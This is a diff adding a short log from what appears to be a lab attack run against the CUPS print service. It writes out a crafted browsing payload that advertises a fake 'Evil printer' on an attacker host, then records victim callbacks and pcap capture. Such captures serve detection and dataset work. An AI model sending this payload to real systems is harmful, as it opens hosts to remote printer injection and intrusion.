@@ -1,0 +1,6 @@
+2026-11-16 21:05:10,190 INFO sniffing 12s for callbacks (filter: dst host 172.26.0.3 and dst port 12345)
+2026-11-16 21:05:10,692 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilBaseline "Attacker lab" "Evil printer"'
+2026-11-16 21:05:22,208 WARNING CALLBACK: victim 172.26.0.4:39660 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:05:22,208 WARNING CALLBACK: victim 172.26.0.4:46990 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:05:22,208 INFO captured 8 packet(s) after sending
+2026-11-16 21:05:22,216 INFO wrote 9 packet(s) to pcap_files/attack-baseline.pcap
